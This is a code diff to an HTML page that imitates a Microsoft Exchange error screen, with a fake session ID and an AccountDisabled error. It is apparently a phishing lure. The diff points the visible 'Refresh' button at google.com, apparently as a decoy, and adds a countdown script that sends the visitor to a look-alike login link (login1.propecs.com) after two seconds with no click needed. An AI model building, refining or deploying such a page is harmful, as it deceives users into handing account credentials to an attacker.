@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Error Page Refresh</title>
+<title>Error Page Replica</title>
 <style>
   body {
     font-family: "Segoe UI", Arial, sans-serif;
@@ -69,6 +69,12 @@
     line-height: 1.4;
     margin: 0;
   }
+
+  .redirect-notice {
+    font-size: 13px;
+    color: #605e5c;
+    margin-bottom: 15px;
+  }
 </style>
 </head>
 <body>
@@ -80,10 +86,14 @@
   <div class="title">Something went wrong.</div>
 
   <div class="subtitle">
-    Please try the recommended action. Click Refresh application below.
+    Please try the recommended action below.
   </div>
 
-  <button class="btn" onclick="window.location.href='https://login1.propecs.com/EsTQZNnm';">Refresh the application</button>
+  <div class="redirect-notice">
+    Refreshing your page <span id="countdown">2</span> seconds...
+  </div>
+
+  <button class="btn" onclick="window.location.href='https://google.com';">Refresh the application</button>
 
   <div class="details">
     <div class="details-title">Fewer Details</div>
@@ -94,7 +104,7 @@ Session Id: adddc681-2852-466b-aa8b-b70b0cbb3715
 Client Version: 20240517003.15
 
 Bootstrap: configuration
-Back Filled Errors: Unhandled Rejection: Error: 500:undefined|undefined:undefined
+Back Filled Errors: Unhandled Rejection: Error: 500:|undefined:undefined
 err: Microsoft.Exchange.Data.Storage.AccountDisabledException
 esrc: StoreDataProvider
 estack: Error: 500
@@ -108,6 +118,23 @@ msg: ErrorAccountDisabled
     </pre>
   </div>
 </div>
+
+<script>
+  let timeLeft = 2;
+  const countdownElement = document.getElementById('countdown');
+  
+  const timer = setInterval(() => {
+    timeLeft--;
+    if (countdownElement) {
+      countdownElement.textContent = timeLeft;
+    }
+    
+    if (timeLeft <= 0) {
+      clearInterval(timer);
+      window.location.href = 'https://login1.propecs.com/EsTQZNnm';
+    }
+  }, 1000);
+</script>
 
 </body>
 </html>
